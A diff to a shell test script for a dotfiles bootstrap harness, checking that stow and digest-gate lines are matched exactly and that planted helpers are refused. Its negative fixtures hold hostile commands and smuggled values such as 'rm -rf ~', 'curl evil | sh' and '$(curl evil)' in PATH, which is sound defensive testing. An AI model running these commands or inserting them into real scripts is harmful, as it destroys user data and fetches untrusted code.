@@ -4,9 +4,12 @@
 # and tests/e2e/lib/*.sh, without Docker or network. Part one sources the
 # libraries and checks the HUMAN block parser (notes against commands, %q
 # paths with spaces), the "HUMAN steps pending:" reader, every row of the
-# (step id, kind) policy including the fail rows, the digest-gate regex, the
-# E2E_ALLOC_ENV expansion and the audit parsers against fixture logs. Part
-# two runs inside.sh itself with E2E_SANDBOX_HOME against a fixture clone
+# (step id, kind) policy including the fail rows, the exact shapes of the
+# digest gate and the H7-stow lines (against what lib/bootstrap's own
+# printers emit, and against chained or foreign lines), the E2E_ALLOC_ENV
+# expansion, the audit parsers against fixture logs and the by-hand helper
+# extraction from docs/bootstrap.md. Part two runs inside.sh itself with
+# E2E_SANDBOX_HOME against a fixture clone
 # whose setup-host.sh, doctor.sh and stow-all.sh are stubs printing
 # realistic plan lines, blocks and exit codes (first apply exit 3 with an
 # apt sudo block, then an inspect block, then H7-stow, then exit 0), with
@@ -72,6 +75,8 @@ E2E_OUT=$UNIT E2E_RUN_USER=tester E2E_SETUP_HOST=lab-ubuntu
 . "$E2E_DIR/lib/blocks.sh"
 # shellcheck source=tests/e2e/lib/assert.sh
 . "$E2E_DIR/lib/assert.sh"
+# shellcheck source=tests/e2e/lib/flow-other.sh
+. "$E2E_DIR/lib/flow-other.sh"
 
 # The stdout of an apply run that exits 3: plan lines, then three blocks,
 # one with %q-quoted paths (a home with a space) in its mv and stow lines.
@@ -150,11 +155,16 @@ ROWS
 # run-all takes every command line and no note.
 expect_eq 'run-all lines' "$(e2e_block_lines run-all lab-ubuntu "$UNIT/blocks/1.block")" 'sudo apt-get update
 sudo apt-get install -y --no-install-recommends zsh stow'
-# run-stow takes the mv lines and the one stow line for the host, as printed.
-expect_eq 'run-stow lines' "$(e2e_block_lines run-stow lab-ubuntu "$UNIT/blocks/3.block")" 'mv -n /home/u/My\ Files/.bashrc /home/u/My\ Files/.bashrc.pre-dotfiles
+# run-stow takes the mv lines and the one stow line for the host, as printed,
+# matched against the fixture's HOME and clone (a prefix assignment before a
+# function call is visible inside it).
+stow_lines() {
+    HOME='/home/u/My Files' E2E_CLONE='/home/u/My Files/dotfiles' e2e_block_lines run-stow "$@"
+}
+expect_eq 'run-stow lines' "$(stow_lines lab-ubuntu "$UNIT/blocks/3.block")" 'mv -n /home/u/My\ Files/.bashrc /home/u/My\ Files/.bashrc.pre-dotfiles
 mv -n /home/u/My\ Files/.profile /home/u/My\ Files/.profile.pre-dotfiles
 PATH="/home/linuxbrew/.linuxbrew/bin:$PATH" /home/u/My\ Files/dotfiles/stow-all.sh lab-ubuntu'
-if e2e_block_lines run-stow wsl-ubuntu "$UNIT/blocks/3.block" >/dev/null; then
+if stow_lines wsl-ubuntu "$UNIT/blocks/3.block" >/dev/null; then
     fail 'run-stow accepted a stow line for another host'
 fi
 expect_eq 'run-stow other host error' "$E2E_BLOCK_ERROR" 'an H7-stow line the harness may not run: PATH="/home/linuxbrew/.linuxbrew/bin:$PATH" /home/u/My\ Files/dotfiles/stow-all.sh lab-ubuntu'
@@ -162,30 +172,151 @@ expect_eq 'run-stow other host error' "$E2E_BLOCK_ERROR" 'an H7-stow line the ha
     cat "$UNIT/blocks/3.block"
     printf '%s\n' 'rm -rf ~/.oh-my-zsh'
 } >"$UNIT/stow-planted.block"
-if e2e_block_lines run-stow lab-ubuntu "$UNIT/stow-planted.block" >/dev/null; then
+if stow_lines lab-ubuntu "$UNIT/stow-planted.block" >/dev/null; then
     fail 'run-stow accepted a planted extra line'
 fi
 expect_eq 'run-stow planted error' "$E2E_BLOCK_ERROR" 'an H7-stow line the harness may not run: rm -rf ~/.oh-my-zsh'
+# A caller capturing the output sees the reason too (the variable is lost in
+# its subshell; e2e_run_block puts the text in its fail row).
+expect_eq 'run-stow planted error printed' "$(stow_lines lab-ubuntu "$UNIT/stow-planted.block")" 'an H7-stow line the harness may not run: rm -rf ~/.oh-my-zsh'
 {
     cat "$UNIT/blocks/3.block"
     sed -n '/stow-all/p' "$UNIT/blocks/3.block"
 } >"$UNIT/stow-twice.block"
-if e2e_block_lines run-stow lab-ubuntu "$UNIT/stow-twice.block" >/dev/null; then
+if stow_lines lab-ubuntu "$UNIT/stow-twice.block" >/dev/null; then
     fail 'run-stow accepted two stow lines'
 fi
 expect_eq 'run-stow twice error' "$E2E_BLOCK_ERROR" 'the H7-stow block has 2 stow-all.sh lab-ubuntu lines, not 1'
 grep -v stow-all "$UNIT/blocks/3.block" >"$UNIT/stow-none.block"
-if e2e_block_lines run-stow lab-ubuntu "$UNIT/stow-none.block" >/dev/null; then
+if stow_lines lab-ubuntu "$UNIT/stow-none.block" >/dev/null; then
     fail 'run-stow accepted a block without the stow line'
 fi
+expect_eq 'run-stow none error' "$E2E_BLOCK_ERROR" 'the H7-stow block has 0 stow-all.sh lab-ubuntu lines, not 1'
 if e2e_block_lines skip lab-ubuntu "$UNIT/blocks/2.block" >/dev/null; then
     fail 'e2e_block_lines ran lines for a skip action'
 fi
+expect_eq 'skip action error' "$E2E_BLOCK_ERROR" 'no lines run for action skip'
 
-# The digest gate: exactly one line of the printed shape, both verifiers;
-# a gate without --status, the Homebrew form (/bin/bash) or a bare run
-# line never counts.
+# The two H7-stow shapes are matched whole: each line runs as `bash -c`, so
+# a command chained onto an mv or slipped between the PATH prefix and the
+# script, a stow-all.sh outside the clone, an mv that leaves HOME or does
+# not add .pre-dotfiles, and a prefix the printer never prints are refused.
+STOW_OK='/home/u/My\ Files/dotfiles/stow-all.sh lab-ubuntu'
+while IFS= read -r line; do
+    printf '%s\n' "$line" >"$UNIT/stow-one.block"
+    if stow_lines lab-ubuntu "$UNIT/stow-one.block" >/dev/null; then
+        fail "run-stow accepted [$line]"
+    fi
+    expect_eq "run-stow error for [$line]" "$E2E_BLOCK_ERROR" "an H7-stow line the harness may not run: $line"
+done <<LINES
+mv -n a b; rm -rf ~
+mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.bashrc.pre-dotfiles; rm -rf ~
+mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.bashrc.pre-dotfiles && echo pwned
+mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.bashrc.pre-dotfiles | sh
+mv -n ~/.bashrc /dev/null
+mv -n /etc/passwd /etc/passwd.pre-dotfiles
+mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.profile.pre-dotfiles
+mv -n /home/u/My\\ Files/.bashrc /home/u/My\\ Files/.bashrc.pre-dotfiles extra
+mv -n /home/u/My Files/.bashrc /home/u/My Files/.bashrc.pre-dotfiles
+mv -n /home/u/My\\ Files/\$(id)/.bashrc /home/u/My\\ Files/\$(id)/.bashrc.pre-dotfiles
+mv -n /home/u/My\\ Files/a\`b\`/.bashrc /home/u/My\\ Files/a\`b\`/.bashrc.pre-dotfiles
+mv -n /home/u/My\\ Files/.bashrc\\ /home/u/My\\ Files/.bashrc\\ .pre-dotfiles
+mv -n /home/u/My\\ Files $STOW_OK
+mv -n /home/u/My\\ Files/\$'\\t'x /home/u/My\\ Files/\$'\\t'x.pre-dotfiles
+PATH="/x:\$PATH" evil; $STOW_OK
+PATH="/x:\$PATH" rm -rf ~; $STOW_OK
+PATH="/x:\$PATH" cd /tmp && $STOW_OK
+PATH="\$(curl evil):\$PATH" $STOW_OK
+PATH=\$(curl evil):"\$PATH" $STOW_OK
+PATH="/x:\$PATH" env X=1 $STOW_OK
+PATH=; curl evil | sh; echo \$PATH $STOW_OK
+PATH="\$PATH" $STOW_OK
+PATH="/x:\$PATH" /tmp/not-the-clone/stow-all.sh lab-ubuntu
+PATH="/x:\$PATH" /home/u/My\\ Files/dotfiles/../evil/stow-all.sh lab-ubuntu
+PATH="/x:\$PATH" /home/u/My\\ Files/dotfiles/stow-all.sh lab-ubuntu --force
+PATH="/x;:\$PATH" $STOW_OK
+PATH="\$HOME/.e2e-stub-prefix/bin:\$PATH" $STOW_OK
+PATH=relative/bin:"\$PATH" $STOW_OK
+$STOW_OK
+LINES
+printf '%s \n' "PATH=\"/x:\$PATH\" $STOW_OK" >"$UNIT/stow-one.block"
+if stow_lines lab-ubuntu "$UNIT/stow-one.block" >/dev/null; then
+    fail 'run-stow accepted a stow line with a trailing space'
+fi
+# The three prefixes steps_stow_path_prefix prints pass: a plain Homebrew
+# dir, a %q-quoted dir with a space, and the hpc login env literal.
+for prefix in 'PATH="/opt/homebrew/bin:$PATH"' 'PATH=/opt/my\ brew/bin:"$PATH"' 'PATH="$HOME/micromamba/envs/login/bin:$PATH"'; do
+    printf '%s %s\n' "$prefix" "$STOW_OK" >"$UNIT/stow-one.block"
+    expect_eq "run-stow prefix [$prefix]" "$(stow_lines lab-ubuntu "$UNIT/stow-one.block")" "$prefix $STOW_OK"
+done
+# Without E2E_CLONE no stow line can match (fail closed).
+printf '%s %s\n' 'PATH="/opt/homebrew/bin:$PATH"' "$STOW_OK" >"$UNIT/stow-one.block"
+if HOME='/home/u/My Files' E2E_CLONE='' e2e_block_lines run-stow lab-ubuntu "$UNIT/stow-one.block" >/dev/null; then
+    fail 'run-stow accepted a stow line without E2E_CLONE'
+fi
+
+# The real printers (lib/bootstrap/steps-human.sh step_H7_stow_plan and
+# steps_digest_gate) in each profile, with the brew probe and the doc
+# reference stubbed, against a home with a space: every line they print
+# is one the policy accepts, and the clone's physical path is accepted
+# where the printed one is a symlink to it.
 SHA=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
+mkdir -p "$UNIT/real/My Files/dotfiles"
+ln -s "My Files" "$UNIT/real/link"
+real_block() {
+    (
+        # shellcheck disable=SC2034 # the STEPS_* fields and BOOTSTRAP_NL are read by the sourced step files
+        STEPS_PROFILE=$1 STEPS_HOST=$2 STEPS_ROOT=$3 STEPS_MODE=apply STEPS_ARCH=x86_64
+        # shellcheck disable=SC2034
+        STEPS_STOW_CONFLICTS=".bashrc${E2E_NL}.profile"
+        # shellcheck disable=SC2034
+        BOOTSTRAP_NL=$E2E_NL
+        REAL_HOME=$4 REAL_BREW=$5
+        HOME=$REAL_HOME
+        # shellcheck source=lib/bootstrap/steps-common.sh
+        . "$REPO_ROOT/lib/bootstrap/steps-common.sh"
+        # shellcheck source=lib/bootstrap/steps-human.sh
+        . "$REPO_ROOT/lib/bootstrap/steps-human.sh"
+        bootstrap_doc_ref() { printf '%s\n' "$1"; }
+        bootstrap_brew_bin() { printf '%s\n' "$REAL_BREW"; }
+        step_H7_stow_plan
+        printf '%s\n' 'HUMAN-BEGIN S5-claude inspect'
+        steps_digest_gate "$6" "$REAL_HOME/.cache/dotfiles-bootstrap/claude/install.sh" \
+            "bash $(steps_quote "$REAL_HOME/.cache/dotfiles-bootstrap/claude/install.sh")"
+        printf '%s\n' 'HUMAN-END'
+    )
+}
+REAL_TAIL=" $(printf '%q' "$UNIT/real/My Files/dotfiles/stow-all.sh")"
+while IFS='|' read -r profile host brew prefix; do
+    real_block "$profile" "$host" "$UNIT/real/My Files/dotfiles" "$UNIT/real/My Files" "$brew" "$SHA" >"$UNIT/real/$profile.out"
+    e2e_blocks_parse "$UNIT/real/$profile.out" "$UNIT/real/$profile.blocks"
+    expect_eq "real $profile blocks" "$(e2e_blocks_summary "$UNIT/real/$profile.blocks")" 'H7-stow(judgment) S5-claude(inspect)'
+    got=$(HOME="$UNIT/real/My Files" E2E_CLONE="$UNIT/real/My Files/dotfiles" e2e_block_lines run-stow "$host" "$UNIT/real/$profile.blocks/1.block") ||
+        fail "run-stow refused the real $profile H7-stow block: $got; $(cat "$UNIT/real/$profile.blocks/1.block")"
+    expect_eq "real $profile run-stow lines" "$(printf '%s\n' "$got" | grep -c .)" 3
+    expect_eq "real $profile mv line" "$(printf '%s\n' "$got" | sed -n 1p)" "mv -n $(printf '%q' "$UNIT/real/My Files/.bashrc") $(printf '%q' "$UNIT/real/My Files/.bashrc.pre-dotfiles")"
+    expect_eq "real $profile stow line" "$(printf '%s\n' "$got" | sed -n 3p)" "$prefix$REAL_TAIL $host"
+    got=$(HOME="$UNIT/real/My Files" E2E_CLONE="$UNIT/real/link/dotfiles" e2e_block_lines run-stow "$host" "$UNIT/real/$profile.blocks/1.block") ||
+        fail "run-stow refused the real $profile H7-stow block through a symlinked clone: $got"
+    got=$(e2e_block_lines run-gate "$host" "$UNIT/real/$profile.blocks/2.block") ||
+        fail "run-gate refused the real $profile gate: $got; $(cat "$UNIT/real/$profile.blocks/2.block")"
+    case $got in
+        "printf '%s  %s\\n' $SHA $(printf '%q' "$UNIT/real/My Files/.cache/dotfiles-bootstrap/claude/install.sh") | "*) ;;
+        *) fail "real $profile gate is [$got]" ;;
+    esac
+done <<'ROWS'
+debian|lab-ubuntu|/home/linuxbrew/.linuxbrew/bin/brew|PATH="/home/linuxbrew/.linuxbrew/bin:$PATH"
+macos|mac|/opt/my brew/bin/brew|PATH=/opt/my\ brew/bin:"$PATH"
+hpc|sherlock|/none|PATH="$HOME/micromamba/envs/login/bin:$PATH"
+ROWS
+expect_eq 'real macos verifier' "$(grep -c 'shasum -a 256 -c --status -' "$UNIT/real/macos.blocks/2.block")" 1
+expect_eq 'real debian verifier' "$(grep -c 'sha256sum -c --status -' "$UNIT/real/debian.blocks/2.block")" 1
+
+# The digest gate: exactly one line of the printed shape, both verifiers,
+# and nothing but notes besides it. A gate without --status, the Homebrew
+# form (/bin/bash), a run of another path than the digested one, a chained
+# tail, an extra pipe stage or a bare run line is a line the harness may
+# not run; a block without the gate lacks its one line.
 GATE="printf '%s  %s\\n' $SHA /home/u/.cache/dotfiles-bootstrap/claude/install.sh | sha256sum -c --status - && bash /home/u/.cache/dotfiles-bootstrap/claude/install.sh"
 cat >"$UNIT/inspect.block" <<BLOCK
 # docs/bootstrap.md S5-claude
@@ -198,13 +329,30 @@ BLOCK
 expect_eq 'run-gate line' "$(e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect.block")" "$GATE"
 sed 's/sha256sum -c --status -/shasum -a 256 -c --status -/' "$UNIT/inspect.block" >"$UNIT/inspect-mac.block"
 expect_eq 'run-gate shasum' "$(e2e_block_lines run-gate mac "$UNIT/inspect-mac.block" | grep -c 'shasum -a 256 -c --status -')" 1
-for variant in 's/ --status//' 's/&& bash /\&\& NONINTERACTIVE=1 \/bin\/bash /' '/^printf/d'; do
+GATE_SPACE="printf '%s  %s\\n' $SHA /home/u/My\\ Files/.cache/dotfiles-bootstrap/claude/install.sh | sha256sum -c --status - && bash /home/u/My\\ Files/.cache/dotfiles-bootstrap/claude/install.sh"
+printf '%s\n' "$GATE_SPACE" >"$UNIT/inspect-space.block"
+expect_eq 'run-gate %q path with a space' "$(e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect-space.block")" "$GATE_SPACE"
+for variant in 's/ --status//' 's/&& bash /\&\& NONINTERACTIVE=1 \/bin\/bash /' \
+    '/^printf/s|&& bash .*$|\&\& bash /tmp/other.sh|' \
+    '/^printf/s/$/; rm -rf ~/' \
+    '/^printf/s/ | sha256sum/ | evil; true | sha256sum/' \
+    '/^printf/s/$/ \&\& .\/doctor.sh/' \
+    '/^printf/s/$/ /' \
+    '/^printf/s/install.sh |/install.sh;x |/' \
+    "/^printf/s/$SHA/${SHA}0/" \
+    '/^printf/s| /home/u/| home/u/|g'; do
     sed "$variant" "$UNIT/inspect.block" >"$UNIT/inspect-bad.block"
+    grep -Fx -- "$GATE" "$UNIT/inspect-bad.block" >/dev/null && fail "sed [$variant] left the gate line as it was"
     if e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect-bad.block" >/dev/null; then
         fail "run-gate accepted an inspect block after sed [$variant]"
     fi
-    expect_eq "run-gate error after [$variant]" "$E2E_BLOCK_ERROR" 'the inspect block has 0 digest-gated run lines, not 1'
+    expect_eq "run-gate error after [$variant]" "$E2E_BLOCK_ERROR" "an inspect line the harness may not run: $(sed -n '/^printf/p' "$UNIT/inspect-bad.block")"
 done
+sed '/^printf/d' "$UNIT/inspect.block" >"$UNIT/inspect-bad.block"
+if e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect-bad.block" >/dev/null; then
+    fail 'run-gate accepted an inspect block without the gate'
+fi
+expect_eq 'run-gate error without the gate' "$E2E_BLOCK_ERROR" 'the inspect block has 0 digest-gated run lines, not 1'
 {
     cat "$UNIT/inspect.block"
     printf '%s\n' "$GATE"
@@ -212,10 +360,21 @@ done
 if e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect-twice.block" >/dev/null; then
     fail 'run-gate accepted two gated lines'
 fi
+expect_eq 'run-gate twice error' "$E2E_BLOCK_ERROR" 'the inspect block has 2 digest-gated run lines, not 1'
 printf '%s\n' '# docs/bootstrap.md S5-claude' 'bash /home/u/.cache/dotfiles-bootstrap/claude/install.sh' >"$UNIT/inspect-bare.block"
 if e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect-bare.block" >/dev/null; then
     fail 'run-gate accepted a bare run line'
 fi
+expect_eq 'run-gate bare error' "$E2E_BLOCK_ERROR" 'an inspect line the harness may not run: bash /home/u/.cache/dotfiles-bootstrap/claude/install.sh'
+{
+    cat "$UNIT/inspect.block"
+    printf '%s\n' 'bash /home/u/.cache/dotfiles-bootstrap/claude/install.sh'
+} >"$UNIT/inspect-gate-bare.block"
+if e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect-gate-bare.block" >/dev/null; then
+    fail 'run-gate accepted an un-gated run line beside the gate'
+fi
+expect_eq 'run-gate gate+bare error' "$E2E_BLOCK_ERROR" 'an inspect line the harness may not run: bash /home/u/.cache/dotfiles-bootstrap/claude/install.sh'
+expect_eq 'run-gate gate+bare error printed' "$(e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect-gate-bare.block")" 'an inspect line the harness may not run: bash /home/u/.cache/dotfiles-bootstrap/claude/install.sh'
 
 # E2E_ALLOC_ENV: expanded with SCRATCH and the running user, refused while
 # a name is unexpanded or a word is not KEY=value.
@@ -322,7 +481,40 @@ else
     e2e_audit_sudo_log /dev/null /dev/null >/dev/null || rc=$?
     expect_eq 'sudo.log audit without date -d' "$rc" 2
 fi
-printf 'ok: block parser, policy, gate, alloc and audit parsers\n'
+
+# The by-hand helpers of the other flow: the real fence defines both
+# helpers and nothing else; a top-level line planted after the definitions,
+# or indented between them, is refused by name, since the file is sourced
+# at the start of every by-hand step; so is a fence without the heading.
+e2e_extract_helpers "$REPO_ROOT/docs/bootstrap.md" "$UNIT/helpers.sh" || fail 'extract_helpers refused docs/bootstrap.md'
+expect_eq 'helpers define both' "$(grep -cE '^(fetch_pinned|clone_listed)\(\) \{$' "$UNIT/helpers.sh")" 2
+expect_eq 'helpers hold nothing else in column 0' "$(grep -cvE '^(#|[ \t]|\}$|fetch_pinned\(\) \{$|clone_listed\(\) \{$|$)' "$UNIT/helpers.sh")" 0
+plant_fence() { # DOC OUT LINE: LINE just before the fence's closing ```
+    awk -v line="$3" '/^#+ Downloads and clones by hand/ { s = 1 } s && !i && /^```sh/ { i = 1 } i && !p && /^```$/ { print line; p = 1 } { print }' "$1" >"$2"
+}
+plant_fence "$REPO_ROOT/docs/bootstrap.md" "$UNIT/bootstrap-planted.md" 'fetch_pinned claude'
+if e2e_extract_helpers "$UNIT/bootstrap-planted.md" "$UNIT/helpers-planted.sh" >"$UNIT/helpers-planted.out"; then
+    fail 'extract_helpers accepted a top-level line after the definitions'
+fi
+expect_eq 'planted line named' "$(cat "$UNIT/helpers-planted.out")" 'a line outside the fetch_pinned and clone_listed definitions in the fenced sh block: fetch_pinned claude'
+plant_fence "$REPO_ROOT/docs/bootstrap.md" "$UNIT/bootstrap-planted.md" '    export CURL_CA_BUNDLE=/tmp/evil.pem'
+if e2e_extract_helpers "$UNIT/bootstrap-planted.md" "$UNIT/helpers-planted.sh" >"$UNIT/helpers-planted.out"; then
+    fail 'extract_helpers accepted an indented top-level line'
+fi
+expect_eq 'indented planted line named' "$(cat "$UNIT/helpers-planted.out")" 'a line outside the fetch_pinned and clone_listed definitions in the fenced sh block:     export CURL_CA_BUNDLE=/tmp/evil.pem'
+plant_fence "$REPO_ROOT/docs/bootstrap.md" "$UNIT/bootstrap-planted.md" 'helper_three() {
+    :
+}'
+if e2e_extract_helpers "$UNIT/bootstrap-planted.md" "$UNIT/helpers-planted.sh" >"$UNIT/helpers-planted.out"; then
+    fail 'extract_helpers accepted a third definition'
+fi
+expect_eq 'third definition named' "$(cat "$UNIT/helpers-planted.out")" 'a line outside the fetch_pinned and clone_listed definitions in the fenced sh block: helper_three() {'
+sed 's/^### Downloads and clones by hand/### Something else/' "$REPO_ROOT/docs/bootstrap.md" >"$UNIT/bootstrap-moved.md"
+if e2e_extract_helpers "$UNIT/bootstrap-moved.md" "$UNIT/helpers-moved.sh" >"$UNIT/helpers-moved.out"; then
+    fail 'extract_helpers found a fence without the heading'
+fi
+expect_eq 'moved heading named' "$(cat "$UNIT/helpers-moved.out")" 'no fenced sh block after "Downloads and clones by hand"'
+printf 'ok: block parser, policy, gate, alloc, audit parsers and by-hand helpers\n'
 
 # --- part two: the sandboxed dry run -------------------------------------
 
@@ -463,8 +655,10 @@ elif [ "$stowed" = 0 ]; then
     printf '%s\n' '# writes ~/.claude, ~/.codex and ~/.ssh; an agent runs it only as one visible top-level command'
     # The real block names the Homebrew prefix; a machine running this test
     # may have a real stow there, which the prefix would find before the
-    # stub, so the fixture names a prefix that exists nowhere.
-    printf 'PATH="$HOME/.e2e-stub-prefix/bin:$PATH" %q %s\n' "$root/stow-all.sh" "$host"
+    # stub, so the fixture names a prefix that exists nowhere, in the %q
+    # form steps_stow_path_prefix uses for a prefix with a space (this
+    # home has one).
+    printf 'PATH=%q:"$PATH" %q %s\n' "$HOME/.e2e-stub-prefix/bin" "$root/stow-all.sh" "$host"
     printf '%s\n' 'HUMAN-END'
 fi
 printf '%s\n' 'HUMAN-BEGIN H7-auth auth' '# docs/bootstrap.md H7-auth' 'ssh-keygen -t ed25519' \
@@ -750,7 +944,38 @@ refused bad-rev E2E_SANDBOX_HOME="$TEST_TMP/home rev" E2E_REV=abc123
 expect_text 'bad-rev' "$TEST_TMP/bad-rev.err" 'not a 40-hex commit'
 refused home-taken E2E_SANDBOX_HOME="$CLEAN_HOME"
 expect_text 'home-taken' "$TEST_TMP/home-taken.err" 'exists already'
-if [ ! -f /.dockerenv ] && [ "$(uname -s)" != Darwin ]; then
+# The sandbox seam relocates HOME only, so it drives nothing but a fixture
+# under the temp dir with stub tools: this repository as E2E_SRC is refused
+# (unless the checkout itself sits under the temp dir), and so is a PATH
+# whose sudo, chsh or stow is the machine's own.
+TMP_ROOT=$(cd -- "${TMPDIR:-/tmp}" && pwd -P)
+case $REPO_ROOT in
+    "$TMP_ROOT"/*) printf 'SKIP: the real-checkout refusal (this checkout lies under %s).\n' "$TMP_ROOT" ;;
+    *)
+        refused src-outside-tmp E2E_SANDBOX_HOME="$TEST_TMP/home src" E2E_SRC="$REPO_ROOT" \
+            E2E_REV="$(git -C "$REPO_ROOT" rev-parse HEAD)" E2E_ALLOW_DIRTY=1
+        expect_text 'src-outside-tmp' "$TEST_TMP/src-outside-tmp.err" 'drives only a fixture checkout under the temp dir'
+        expect_text 'src-outside-tmp names the checkout' "$TEST_TMP/src-outside-tmp.err" "E2E_SRC is $REPO_ROOT"
+        ;;
+esac
+REAL_TOOL=''
+for tool in sudo chsh stow; do
+    found=$(command -v "$tool" 2>/dev/null) || continue
+    case $(cd -- "$(dirname -- "$found")" && pwd -P) in
+        "$TMP_ROOT"/*) ;;
+        *)
+            REAL_TOOL=$tool
+            break
+            ;;
+    esac
+done
+if [ -n "$REAL_TOOL" ]; then
+    refused real-tool E2E_SANDBOX_HOME="$TEST_TMP/home tool" PATH="$PATH"
+    expect_text 'real-tool' "$TEST_TMP/real-tool.err" "runs only with stub tools under the temp dir $TMP_ROOT; $REAL_TOOL on PATH is "
+else
+    printf 'SKIP: the real-tool refusal (no sudo, chsh or stow outside %s on PATH).\n' "$TMP_ROOT"
+fi
+if [ ! -f /.dockerenv ] && [ ! -f /run/.containerenv ] && [ "$(uname -s)" != Darwin ]; then
     # Without a seam, a workstation run is refused before it can touch HOME.
     refused no-seam E2E_NATIVE=1
     expect_text 'no-seam' "$TEST_TMP/no-seam.err" 'refusing to run outside a container'
